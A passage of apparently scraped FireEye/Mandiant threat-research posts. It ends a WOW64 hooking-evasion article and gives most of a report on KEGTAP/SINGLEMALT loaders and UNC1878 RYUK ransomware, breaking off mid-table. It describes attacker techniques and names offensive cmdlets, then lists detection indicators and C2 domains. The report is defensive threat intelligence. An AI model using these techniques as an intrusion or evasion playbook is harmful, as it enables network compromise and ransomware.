  employed. The identifying table is:</p>
 <table border="0" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="194" valign="top"><p>
          <b>Evasion Mode</b></p> </td> <td width="87" valign="top"><p>
          <b>32bit Inline</b></p> </td> <td width="97" valign="top"><p>
          <b>wow64Log</b></p> </td> <td width="91" valign="top"><p>
          <b>64bit Inline</b></p> </td> <td width="156" valign="top"><p>
          <b>Kernel/Hypervisor</b></p> </td> </tr>
    <tr>
      <td width="194" valign="top"><p>Prologue Restore</p> </td> <td
        width="87" valign="top"><p>❌</p> </td> <td width="97" valign="top"><p>
          <b>✔</b></p> </td> <td width="91" valign="top"><p>
          <b>✔</b></p> </td> <td width="156" valign="top"><p>
          <b>✔</b></p> </td> </tr>
    <tr>
      <td width="194" valign="top"><p>Heavens Gate sys-stub</p> </td>
        <td width="87" valign="top"><p>❌</p> </td> <td width="97"
        valign="top"><p>❌</p> </td> <td width="91" valign="top"><p>
          <b>✔</b></p> </td> <td width="156" valign="top"><p>
          <b>✔</b></p> </td> </tr>
    <tr>
      <td width="194" valign="top"><p>Heavens Gate direct syscall</p>
      </td> <td width="87" valign="top"><p>❌</p> </td> <td width="97"
        valign="top"><p>❌</p> </td> <td width="91" valign="top"><p>❌</p>
      </td> <td width="156" valign="top"><p>
          <b>✔</b></p> </td> </tr></tbody></table>
 <h4>Structure Appendix</h4>
 <p>
  <span class="code">struct _WOW64_CPURESERVED<br />  {<br />    USHORT
    Flags;<br />    USHORT MachineType;<br />    WOW64_CONTEXT
    Context;<br />    char ContextEx[1024];<br />  };</span></p>
 <p>
  <span class="code">typedef ULONG *WOW64_LOG_ARGUMENTS;<br />  struct
    _WOW64_SYSTEM_SERVICE<br />  {<br />    unsigned __int32
    SystemCallNumber : 12;<br />    unsigned __int32 ServiceTableIndex :
    4;<br />    unsigned __int32 TurboThunkNumber : 5;<br />    unsigned
    __int32 AlwaysZero : 11;<br />  };<br />  #pragma pack(push,
    1)<br />  struct _WOW64_FLOATING_SAVE_AREA<br />  {<br />    DWORD
    ControlWord;<br />    DWORD StatusWord;<br />    DWORD
    TagWord;<br />    DWORD ErrorOffset;<br />    DWORD
    ErrorSelector;<br />    DWORD DataOffset;<br />    DWORD
    DataSelector;<br />    BYTE RegisterArea[80];<br />    DWORD
    Cr0NpxState;<br />  };<br />  #pragma pack(pop)</span></p>
 <p>
  <span class="code">#pragma pack(push, 1)<br />  struct
    _WOW64_CONTEXT<br />  {<br />    DWORD ContextFlags;<br />    DWORD
    Dr0;<br />    DWORD Dr1;<br />    DWORD Dr2;<br />    DWORD
    Dr3;<br />    DWORD Dr6;<br />    DWORD Dr7;<br />   
    WOW64_FLOATING_SAVE_AREA FloatSave;<br />    DWORD SegGs;<br />   
    DWORD SegFs;<br />    DWORD SegEs;<br />    DWORD SegDs;<br />   
    DWORD Edi;<br />    DWORD Esi;<br />    DWORD Ebx;<br />    DWORD
    Edx;<br />    DWORD Ecx;<br />    DWORD Eax;<br />    DWORD
    Ebp;<br />    DWORD Eip;<br />    DWORD SegCs;<br />    DWORD
    EFlags;<br />    DWORD Esp;<br />    DWORD SegSs;<br />    BYTE
    ExtendedRegistersUnk[160];<br />    M128A Xmm0;<br />    M128A
    Xmm1;<br />    M128A Xmm2;<br />    M128A Xmm3;<br />    M128A
    Xmm4;<br />    M128A Xmm5;<br />    M128A Xmm6;<br />    M128A
    Xmm7;<br />    M128A Xmm8;<br />    M128A Xmm9;<br />    M128A
    Xmm10;<br />    M128A Xmm11;<br />    M128A Xmm12;<br />    M128A
    Xmm13;<br />    M128A Xmm14;<br />    M128A Xmm15;<br />  };<br />
    #pragma pack(pop)</span></p>
http://www.fireeye.com/blog/threat-research/2020/11/wow64-subsystem-internals-and-hooking-techniques.html2020-11-09T19:00:00.000Z2020-11-16T17:59:03.414ZUnhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chasernoemail@noemail.orgKimberly Goody<p>Throughout 2020, <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/03/they-come-in-the-night-ransomware-deployment-trends.html">ransomware
  activity</a> has become increasingly prolific, relying on an ecosystem
  of distinct but co-enabling operations to gain access to targets of
  interest before conducting extortion. Mandiant Threat Intelligence has
  tracked several loader and backdoor campaigns that lead to the
  post-compromise deployment of ransomware, sometimes within <a
    href="https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/">24
    hours of initial compromise</a>. Effective and fast detection of
  these campaigns is key to <a
    href="/content/fireeye-www/en_US/blog/products-and-services/2020/06/sizing-up-how-mandiant-evaluates-ransomware-defense.html">mitigating
    this threat</a>.</p>
 <p>The malware families enabling these attacks previously reported by
  Mandiant to intelligence subscribers include KEGTAP/BEERBOT,
  SINGLEMALT/STILLBOT and WINEKEY/CORKBOT. While these malware families
  communicate with the same command and control infrastructure (C2) and
  are close to functional parity, there are minimal code overlaps across
  them. Other security researchers have tracked these malware families
  under the names BazarLoader and <a
  href="https://www.vkremez.com/2020/04/lets-learn-trickbot-bazarbackdoor.html">BazarBackdoor</a>
  or <a href="https://research.nccgroup.com/2020/06/02/in-depth-analysis-of-the-new-team9-malware-family/">Team9</a>.</p>
 <p>The operators conducting these campaigns have actively targeted
  hospitals, retirement communities, and medical centers, even in the <a
    href="/content/fireeye-www/en_US/blog/executive-perspective/2020/10/ransomware-the-threat-we-can-no-longer-afford-to-ignore.html">midst
    of a global health crisis</a>, demonstrating a clear disregard for
  human life.</p>
 <h4>Email Campaign TTPs</h4>
 <p>Campaigns distributing KEGTAP, SINGLEMALT and WINEKEY have been sent
  to individuals at organizations across a broad range of industries and
  geographies using a series of shifting delivery tactics, techniques
  and procedures (TTPs). Despite the frequent changes seen across these
  campaigns, the following has remained consistent across recent activity:</p>
 <ul> <li>Emails contain an in-line link to an actor-controlled Google
    Docs document, typically a PDF file.</li> <li>This document contains
    an in-line link to a URL hosting a malware payload.</li> <li>Emails
    masquerade as generic corporate communications, including follow-ups
    about documents and phone calls or emails crafted to appear related
    to complaints, terminations, bonuses, contracts, working schedules,
    surveys or queries about business hours.</li> <li>Some email
    communications have included the recipient’s name or employer name
    in the subject line and/or email body.</li> </ul>
 <p>Despite this uniformity, the associated TTPs have otherwise changed
  regularly—both between campaigns and across multiple spam runs seen in
  the same day. Notable ways that these campaigns have varied over time include:</p>
 <ul> <li>Early campaigns were delivered via Sendgrid and included
    in-line links to Sendgrid URLs that would redirect users to
    attacker-created Google documents. In contrast, recent campaigns
    have been delivered via attacker-controlled or compromised email
    infrastructure and have commonly contained in-line links to
    attacker-created Google documents, although they have also used
    links associated with the Constant Contact service.</li> <li>The
    documents loaded by these in-line links are crafted to appear
    somewhat relevant to the theme of the email campaign and contain
    additional links along with instructions directing users to click on
    them. When clicked, these links download malware binaries with file
    names masquerading as document files. Across earlier campaigns these
    malware binaries were hosted on compromised infrastructure, however,
    the attackers have shifted to hosting their malware on legitimate
    web services, including Google Drive, Basecamp, Slack, Trello,
    Yougile, and JetBrains.</li> <li>In recent campaigns, the malware
    payloads have been hosted on numerous URLs associated with one or
    more of these legitimate services. In cases where the payloads have
    been taken down, the actors have sometimes updated their Google
    documents to contain new, working links.</li> <li>Some campaigns
    have also incorporated customization, including emails with internal
    references to the recipients’ organizations (Figure 1) and
    organizations’ logos embedded into the Google Docs documents (Figure
  2).</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/botlogger/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Email containing internal
    references to target an organization’s name</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/botlogger/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Google Docs PDF document
    containing a target organization’s logo</span></p>
 <p>Hiding the final payload behind multiple links is a simple yet
  effective way to bypass some email filtering technologies. Various
  technologies have the ability to follow links in an email to try to
  identify malware or malicious domains; however, the number of links
  followed can vary. Additionally, embedding links within a PDF document
  further makes automated detection and link-following difficult.</p>
 <h4>Post-Compromise TTPs</h4>
 <p>Given the possibility that accesses obtained from these campaigns
  may be provided to various operators to monetize, the latter-stage
  TTPs, including ransomware family deployed, may vary across
  intrusions. A notable majority of cases where Mandiant has had
  visibility into these post-compromise TTPs have been attributable to
  UNC1878, a financially motivated actor that monetizes network access
  via the deployment of RYUK ransomware.</p>
 <p>
  <i>Establish Foothold</i></p>
 <p>Once the loader and backdoor have been executed on the initial
  victim host, the actors have used this initial backdoor to download
  POWERTRICK and/or Cobalt Strike BEACON payloads to establish a
  foothold. Notably, the respective loader and backdoor as well as
  POWERTRICK have typically been installed on a small number of hosts in
  observed incidents, suggesting these payloads may be reserved for
  establishing a foothold and performing initial network and host
  reconnaissance. However, BEACON is frequently found on a larger number
  of hosts and used throughout various stages of the attack lifecycle.</p>
 <p>
  <i>Maintain Presence</i></p>
 <p>Beyond the preliminary phases of each intrusion, we have seen
  variations in how these attackers have maintained presence after
  establishing an initial foothold or moving laterally within a network.
  In addition to the use of common post-exploitation frameworks such as
  Cobalt Strike, Metasploit and EMPIRE, we have observed the use of
  other backdoors, including ANCHOR, that we also believe to be under
  control of the actors behind TrickBot.</p>
 <ul> <li>The loaders associated with this activity can maintain
    persistence through reboot by using at least four different
    techniques, including creating a scheduled task, adding itself to
    the startup folder as a shortcut, creating a scheduled Microsoft
    BITS job using /setnotifycmdline, and adding itself to the Userinit
    value under the following registry key:<ul>
        <li>HKLM\SOFTWARE\Microsoft\Windows
      NT\CurrentVersion\Winlogon.</li> </ul> </li> <li>Actors have
    downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike
    BEACON payloads following the initial compromise. BEACON payloads
    have commonly been executed after moving laterally to new hosts
    within the victim network. The attackers have employed Cobalt Strike
    payloads crafted to maintain persistence through reboot
    via a scheduled task on critical systems in victim
    environments. Notably, BEACON is the backdoor observed most
    frequently across these incidents.</li> <li>We have observed actors
    executing encoded PowerShell commands that ultimately executed
    instances of the PowerShell EMPIRE backdoor.</li> <li>The actors
    were observed using BEACON to execute <a
    href="https://github.com/Sw4mpf0x/PowerLurk">PowerLurk's</a>
    Register-MaliciousWmiEvent cmdlet to register WMI events used to
    kill processes related to security tools and utilities, including
    Task Manager, WireShark, TCPView, ProcDump, Process Explorer,
    Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker,
    Autoruns, AutorunsSC, RegEdit, and RegShot.</li> <li>In at least
    once case, attackers have maintained access to a victim environment
    using stolen credentials to access corporate VPN infrastructure
    configured to require only single-factor authentication.</li> </ul>
 <p>
  <i>Escalate Privileges</i></p>
 <p>The most commonly observed methods for escalating privileges in
  these incidents have involved the use of valid credentials. The actors
  used a variety of techniques for accessing credentials stored in
  memory or on disk to access privileged accounts. </p>
 <ul> <li>The actors used valid credentials obtained using MimiKatz
    variants to escalate privileges. We’ve observed Mimikatz being
    executed both from the file system of victim hosts and via
    PowerShell cmdlets executed via Cobalt Strike BEACON.</li>
    <li>Actors have gained access to credentials via exported copies
    of the <i>ntds.dit</i> Active Directory database and SYSTEM and
    SECURITY registry hives from a Domain Controller. </li> <li>In
    multiple instances, the actors have launched attacks against
    Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module,
    and the Invoke-Kerberoast cmdlet.</li> </ul>
 <p>
  <i>Reconnaissance</i></p>
 <p>The approaches taken to perform host and network reconnaissance
  across these incidents varied; however, a significant portion of
  observed reconnaissance activity has revolved around Activity
  Directory enumeration using publicly available utilities such as
  BLOODHOUND, SHARPHOUND or ADFind, as well as the execution of
  PowerShell cmdlets using Cobalt Strike BEACON.</p>
 <ul> <li>BEACON has been installed on a large number of systems across
    these intrusions and has been used to execute various reconnaissance
    commands including both built-in host commands and PowerShell
    cmdlets. Observed PowerShell cmdlets include:<ul>
      <li>Get-GPPPassword</li> <li>Invoke-AllChecks</li>
      <li>Invoke-BloodHound</li> <li>Invoke-EternalBlue</li>
      <li>Invoke-FileFinder</li> <li>Invoke-HostRecon</li>
      <li>Invoke-Inveigh</li> <li>Invoke-Kerberoast</li>
      <li>Invoke-LoginPrompt</li> <li>Invoke-mimikittenz</li>
      <li>Invoke-ShareFinder</li> <li>Invoke-UserHunter</li> </ul> </li>
    <li>Mandiant has observed actors using POWERTRICK to execute
    built-in system commands on the initial victim host,
    including <i>ipconfig</i>, <i>findstr</i>, and <i>cmd.exe.</i></li>
    <li>The actors leveraged publicly available utilities Adfind,
    BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect
    Active Directory information and credentials.</li> <li>WMIC
    commands have been used to perform host reconnaissance, including
    listing installed software, listing running processes, and
    identifying operating system and system architecture.</li> <li>The
    actors have used a batch script to ping all servers identified
    during Active Directory enumeration and output the results
  to <i>res.txt</i>. </li> <li>The actors used the <i>Nltest </i>command
    to list domain controllers.</li> </ul>
 <p>
  <i>Lateral Movement</i></p>
 <p>Lateral movement was most commonly accomplished using valid
  credentials in combination with Cobalt Strike BEACON, RDP and SMB, or
  using the same backdoors used to establish a foothold in victim networks.</p>
 <ul> <li>The actors have regularly leveraged Cobalt Strike BEACON and
    Metasploit Meterpreter to move laterally within victim
  environments. </li> <li>The actors commonly moved laterally within
    victim environments using compromised accounts—both those belonging
    to regular users and accounts with administrative privileges. In
    addition to the use of common post-exploitation frameworks, lateral
    movement has also been achieved using WMIC commands and the Windows
    RDP and SMB protocols. </li> <li>The actors used the Windows <i>net
    use</i> command to connect to Windows admin shares to move
  laterally.</li> </ul>
 <p>
  <i>Complete Mission</i></p>
 <p>Mandiant is directly aware of incidents involving KEGTAP that
  included the post-compromise deployment of RYUK ransomware. We have
  also observed instances where ANCHOR infections, another backdoor
  associated with the same actors, preceded CONTI or MAZE deployment.</p>
 <ul> <li>In at least one case, an executable was observed that was
    designed to exfiltrate files via SFTP to an attacker-controlled
  server.</li> <li>The actors have used Cobalt Strike BEACON to
    exfiltrate data created through network reconnaissance activities as
    well as user files.</li> <li>The actors were observed deleting their
    tools from victim hosts in an attempt to remove indicators of
  compromise.</li> <li>The actors have used their access to the victim
    network to deploy ransomware payloads. There is evidence to suggest
    that RYUK ransomware was likely deployed via PsExec, but other
    scripts or artifacts related to the distribution process were not
    available for forensic analysis.</li> </ul>
 <h4>Hunting Strategies</h4>
 <p>If an organization identifies a host with an active infection
  believed to be an instance of KEGTAP or a parallel malware family, the
  following containment actions are recommended. Note that due to the
  velocity of this intrusion activity, these actions should be taken in parallel.</p>
 <ul> <li>Isolate and perform a forensic review of any impacted
  systems.</li> <li>Review incoming emails to the user that owns the
    impacted device for emails matching the distribution campaigns, and
    take action to remove the messages from all mailboxes.</li>
    <li>Identify the URLs used by the phishing campaign and block them
    using proxy or network security devices.</li> <li>Reset credentials
    for any user accounts associated with execution of the malware.</li>
    <li>Perform an enterprise wide review for lateral movement
    authentication from the impacted systems.</li> <li>Check
    authentication logs from any single-factor remote access solutions
    that may exist (VPN, VDI, etc) and move towards multi-factor
    authentication (MFA) as soon as possible.</li> </ul>
 <p>An enterprise-wide effort should be made to identify host-based
  artifacts related to the execution of first-stage malware and all
  post-intrusion activity associated with this activity. Some baseline
  approaches to this have been captured as follows.</p>
 <p>Activity associated with the KEGTAP loader can often be identified
  via a review of system startup folders and Userinit values under the
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon registry key.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>%APPDATA%\Microsoft\Windows\Start
        Menu\Programs\Startup\adobe.lnk</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: Example LNK file associated with
    KEGTAP persistence within a system’s startup folders</span>
  <b></b></p>
 <p>SINGLEMALT employs BITS to maintain persistence through reboot and
  can often be identified via a review of anomalous BITS jobs.
  SINGLEMALT uses a well-documented BITS persistence mechanism that
  intentionally creates a job to download a non-existent URL, which will
  trigger a failure event. The job is set to retry on a regular
  interval, thus ensuring the malware continues to run. To review the
  BITS job on a host run the command <span class="code">bitsadmin /list</span>.</p>
 <ul> <li>Display name may be “Adobe Update”, “System autoupdate” or
    another generic value.</li> <li>Notify state may be set to Fail
    (Status 2).</li> <li>FileList URL value may be set to the local host
    or a URL that does not exist.</li> <li>The Notification Command Line
    value may contain the path to the SINGLEMALT sample and/or a command
    to move it to a new location then start it.</li> <li>The Retry Delay
    value will be set.</li> </ul>
 <p>WINEKEY maintains persistence through reboot via the use of registry
  RUN keys. Searching for anomalous RUN keys enterprise-wide can help to
  identify systems impacted by this malware.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>Key:
          HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backup
        Mgr</p> <p>Value: Path to the backdoor</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: Example registry RUN key used by
    WINEKEY to maintain persistence</span></p>
 <p>The ANCHOR backdoor has been seen across a subset of intrusions
  associated with this activity and can often be identified via the
  scheduled tasks it uses to maintain persistence through reboot. The
  scheduled tasks created by ANCHOR are often unnamed, although that is
  not always the case.</p>
 <ul> <li>The identification of named scheduled tasks associated with
    ANCHOR persistence may be constructed according to the following
    pattern: &lt;<i>Random directory within %APPDATA%</i>&gt;
      autoupdate#&lt;<i>random number</i>&gt;.</li> <li>All unnamed
    scheduled tasks should be reviewed, particularly those with a
    creation date consistent with the time of the suspected
  compromise.</li> </ul>
 <p>Although it is a low fidelity indicator, ANCHOR activity may also
  sometimes be identified by searching for binaries within the
  C:\Windows\SysWOW64 directory that have a file name matching the
  following pattern: &lt;<i>8 random lowercase chars</i>&gt;.exe.
  Stacking or sorting on file creation timestamps in the
  C:\Windows\SysWOW64 directory may also help identify malicious files,
  as the directory should be mostly static.</p>
 <p>Post-exploitation activity associated with the deployment of
  ransomware following these campaigns is typically conducted using the
  Cobalt Strike attack framework. The BEACON payload associated with
  Cobalt Strike can often be identified via a review of existing
  registered services and service creation events (Event ID 7045), both
  markers of the mechanism it most commonly employs to maintain persistence.</p>
 <p>The following are additional strategies that may aid in identifying
  associated activity:</p>
 <ul> <li>Organizations can review web proxy logs in order to identify
    HXXP requests for file storage, project management, collaboration or
    communication services with a referrer from a Google Docs
  document.</li> <li>During the associated post-compromise activity,
    attackers have commonly staged their tools and data in the PerfLogs
    directory and C$ share.</li> <li>While collecting data used to
    enable later-stage operations, the attackers commonly leave
    instances of ntds.dit and exports of the SYSTEM and SECURITY
    registry hives on impacted systems.</li> </ul>
 <h4>Hardening Strategies</h4>
 <p>The actions taken by the actors to escalate privileges and move
  laterally in an environment use well-documented techniques that search
  the network and Active Directory for common misconfigurations that
  expose credentials and systems for abuse. Organizations can take steps
  to limit the impact and effectiveness of these techniques. For more
  in-depth recommendations see our <a
    href="https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf">ransomware
    protection white paper</a>.</p>
 <ul> <li>Harden service accounts against brute force and password
    guessing attacks. Most organizations have at least a few service
    accounts with passwords set to never expire. These passwords are
    likely old and insecure. Make a best effort to reset as many of
    these accounts as possible to long and complex passwords. In cases
    where it is possible, migrate to MSAs and gMSAS for automated
  rotation.</li> <li>Prevent the usage of privileged accounts for
    lateral movement. Use GPOs to restrict the ability for privileged
    accounts such as Domain Administrators and privileged service
    accounts from initiating RDP connections and network logins.Actors
    often pick just a few accounts to use for RDP; by limiting the
    number of potential accounts, you provide detection opportunities
    and opportunities to slow the actor.</li> <li>Block internet access
    for servers where possible. Often times there is no business need
    for servers, especially AD infrastructure systems, to access the
    Internet. The actors often choose high-uptime servers for the
    deployment of post-exploitation tools such as BEACON.</li> <li>Block
    uncategorized and newly registered domains using web proxies or DNS
    filters. Often the final payload delivered via phishing is hosted on
    a compromised third-party website that do not have a business
  categorization.</li> <li>Ensure that critical patches are installed on
    Windows systems as well as network infrastructure. We have observed
    attackers exploiting well-known vulnerabilities such as Zerologon
    (CVE-2020-1472) to escalate privileges in an environment prior to
    deploying ransomware. In other cases, possibly unrelated to UNC1878,
    we have observed threat actors gain access to an environment through
    vulnerable VPN infrastructure before deploying ransomware.</li> </ul>
 <p>For more intelligence on ransomware and other threats, please
  register for <a
    href="https://www.fireeye.com/mandiant/advantage.html">Mandiant
    Advantage Free</a>, a no-cost version of our threat intelligence
  platform. Check out this episode of <i>
    <a href="https://www.youtube.com/watch?v=X8r-M-TjT3k">State of the
  Hack</a></i> for additional information on this threat.</p>
 <h4>Campaign Indicators</h4>
 <p>
  <i>Sample Email Subjects / Patterns</i></p>
 <ul> <li>&lt;(first|last)-name&gt;: Important Information</li>
    <li>&lt;Company Name&gt;</li> <li>&lt;Company Name&gt;
  complaint</li> <li>&lt;(first|last)-name&gt;</li>
  <li>&lt;(first|last)-name&gt;</li> <li>Agreement cancellation
  message</li> <li>Agreement cancellation notice</li> <li>Agreement
    cancellation notification</li> <li>Agreement cancellation
  reminder</li> <li>Agreement suspension message</li> <li>Agreement
    suspension notice</li> <li>Agreement suspension notification</li>
    <li>Agreement suspension reminder</li> <li>Arrangement cancellation
  message</li> <li>Arrangement cancellation notice</li> <li>Arrangement
    cancellation notification</li> <li>Arrangement cancellation
  reminder</li> <li>Arrangement suspension message</li> <li>Arrangement
    suspension notice</li> <li>Arrangement suspension notification</li>
    <li>Arrangement suspension reminder</li> <li>Contract cancellation
  message</li> <li>Contract cancellation notice</li> <li>Contract
    cancellation notification</li> <li>Contract cancellation
  reminder</li> <li>Contract suspension message</li> <li>Contract
    suspension notice</li> <li>Contract suspension notification</li>
    <li>Contract suspension reminder</li> <li>debit confirmation</li>
    <li>FW: &lt;Name&gt; Annual Bonus Report is Ready</li> <li>FW:
    Urgent: &lt;Company Name&gt;: A Customer Complaint Request – Prompt
    Action Required</li> <li>RE: &lt;(first|last)-name&gt;</li> <li>RE:
    &lt;(first|last)-name&gt;: Your Payslip for October</li> <li>RE:
    &lt;Company Name&gt; - my visit</li> <li>RE: &lt;Company Name&gt;
    Employee Survey</li> <li>RE: &lt;Company Name&gt; office</li>
    <li>RE: &lt;Name&gt; about complaint</li> <li>RE: &lt;Name&gt;
  bonus</li> <li>RE: &lt;Name&gt; termination list</li> <li>RE:
  &lt;Name&gt;</li> <li>RE: &lt;Company Name&gt; office</li> <li>RE:
  &lt;(first|last)-name&gt;</li> <li>RE: &lt;(first|last)-name&gt;
    &lt;(first|last)-name&gt;: complaint</li> <li>RE:
    &lt;(first|last)-name&gt;: Subpoena</li> <li>RE:
  &lt;(first|last)-name&gt;</li> <li>RE: &lt;(first|last)-name&gt;: Your
    Payslip for September</li> <li>RE: about complaint</li> <li>RE:
    Adopted Filer Forms</li> <li>RE: Business hours adjustment</li>
    <li>RE: Business hours realignment</li> <li>RE: Business hours
  rearrangement</li> <li>RE: Business hours restructuring</li> <li>RE:
    Business schedule adjustment</li> <li>RE: Business schedule
  realignment</li> <li>RE: Business schedule rearrangement</li> <li>RE:
    Business schedule restructuring</li> <li>RE: call me</li> <li>RE:
  changes</li> <li>RE: complaint</li> <li>RE: Complaint in &lt;Company
  Name&gt;.</li> <li>RE: Complaint on &lt;Name&gt;</li> <li>RE: customer
  request</li> <li>RE: debit confirmation</li> <li>RE: document
  copy</li> <li>RE: documents list</li> <li>RE: Edgar Filer forms
  renovations</li> <li>RE: employee bonuses</li> <li>RE: Filer Forms
  adaptations</li> <li>RE: my call</li> <li>RE: New filer form
  types</li> <li>RE: office</li> <li>RE: our meeting</li> <li>RE:
    Payroll Register</li> <li>RE: report confirmation</li> <li>RE:
  situation</li> <li>RE: Subpoena</li> <li>RE: termination</li> <li>RE:
    till 2 pm</li> <li>RE: Urgent &lt;Company Name&gt; Employee Internal
  Survey</li> <li>RE: visit</li> <li>RE: what about your opinion?</li>
    <li>RE: what time?</li> <li>RE: why</li> <li>RE: why this debit</li>
    <li>RE: Working schedule adjustment</li> <li>RE: Working schedule
  realignment</li> <li>RE: Working schedule rearrangement</li> <li>RE:
    Working schedule restructuring</li> <li>RE: Your Payslip for
  September</li> </ul>
 <p>
  <i>Example Malware Family MD5s</i></p>
 <ul> <li>KEGTAP<ul> <li>df00d1192451268c31c1f8568d1ff472</li> </ul>
  </li> <li>BEERBOT<ul> <li>6c6a2bfa5846fab374b2b97e65095ec9</li> </ul>
  </li> <li>SINGLEMALT<ul> <li>37aa5690094cb6d638d0f13851be4246</li>
    </ul> </li> <li>STILLBOT<ul>
      <li>3176c4a2755ae00f4fffe079608c7b25</li> </ul> </li>
      <li>WINEKEY<ul> <li>9301564bdd572b0773f105287d8837c4</li> </ul>
  </li> <li>CORKBOT<ul> <li>0796f1c1ea0a142fc1eb7109a44c86cb</li> </ul>
  </li> </ul>
 <p>
  <i>Code Signing Certificate CNs</i></p>
 <ul> <li>ARTBUD RADOM SP Z O O</li> <li>BESPOKE SOFTWARE SOLUTIONS
  LIMITED</li> <li>Best Fud, OOO</li> <li>BlueMarble GmbH</li> <li>CHOO
    FSP, LLC</li> <li>Company Megacom SP Z O O</li> <li>ESTELLA,
  OOO</li> <li>EXON RENTAL SP Z O O</li> <li>Geksan LLC</li> <li>GLOBAL
    PARK HORIZON SP Z O O</li> <li>Infinite Programming Limited</li>
    <li>James LTH d.o.o.</li> <li>Logika OOO</li> <li>MADAS d.o.o.</li>
    <li>MUSTER PLUS SP Z O O</li> <li>NEEDCODE SP Z O O</li> <li>Nordkod
  LLC</li> <li>NOSOV SP Z O O</li> <li>OOO MEP</li> <li>PLAN CORP PTY
  LTD</li> <li>REGION TOURISM LLC</li> <li>RESURS-RM OOO</li>
    <li>Retalit LLC</li> <li>Rumikon LLC</li> <li>SNAB-RESURS, OOO</li>
    <li>TARAT d.o.o.</li> <li>TES LOGISTIKA d.o.o.</li> <li>VAS CO PTY
  LTD</li> <li>VB CORPORATE PTY. LTD.</li> <li>VITA-DE d.o.o.</li> </ul>
 <h4>UNC1878 Indicators</h4>
 <p>A significant proportion of the post-compromise activity associated
  with these campaigns has involved the distribution of RYUK ransomware
  by a threat group tracked by Mandiant as UNC1878. As such, we are
  releasing indicators associated with this group.</p>
 <p>
  <i>BEACON C2s</i></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="87" valign="top"><p>
          <b>First Seen</b></p> </td> <td width="211" valign="top"><p>
          <b>Domain</b></p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>12/11/19</p> </td> <td width="211"
        valign="top"><p>updatemanagir[.]us</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>12/20/19</p> </td> <td width="211"
        valign="top"><p>cmdupdatewin[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>12/26/19</p> </td> <td width="211"
        valign="top"><p>scrservallinst[.]info</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/10/20</p> </td> <td width="211"
        valign="top"><p>winsystemupdate[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/11/20</p> </td> <td width="211"
        valign="top"><p>jomamba[.]best</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/13/20</p> </td> <td width="211"
        valign="top"><p>updatewinlsass[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/16/20</p> </td> <td width="211"
        valign="top"><p>winsysteminfo[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/20/20</p> </td> <td width="211"
        valign="top"><p>livecheckpointsrs[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/21/20</p> </td> <td width="211"
        valign="top"><p>ciscocheckapi[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/28/20</p> </td> <td width="211"
        valign="top"><p>timesshifts[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/29/20</p> </td> <td width="211"
        valign="top"><p>cylenceprotect[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/30/20</p> </td> <td width="211"
        valign="top"><p>sophosdefence[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/30/20</p> </td> <td width="211"
        valign="top"><p>taskshedulewin[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/30/20</p> </td> <td width="211"
        valign="top"><p>windefenceinfo[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/30/20</p> </td> <td width="211"
        valign="top"><p>lsasswininfo[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/30/20</p> </td> <td width="211"
        valign="top"><p>update-wind[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/30/20</p> </td> <td width="211"
        valign="top"><p>lsassupdate[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/30/20</p> </td> <td width="211"
        valign="top"><p>renovatesystem[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>1/31/20</p> </td> <td width="211"
        valign="top"><p>updatewinsoftr[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>2/2/20</p> </td> <td width="211"
        valign="top"><p>cleardefencewin[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>2/2/20</p> </td> <td width="211"
        valign="top"><p>checkwinupdate[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>2/2/20</p> </td> <td width="211"
        valign="top"><p>havesetup[.]net</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>2/3/20</p> </td> <td width="211"
        valign="top"><p>update-wins[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>2/3/20</p> </td> <td width="211"
        valign="top"><p>conhostservice[.]com</p> </td> </tr>
    <tr>
      <td width="87" valign="top"><p>2/4/20</p> </td> <td width="211"
        valign="top"><p>microsoftupdateswin[.]com</p> </td> </tr>
    <tr>
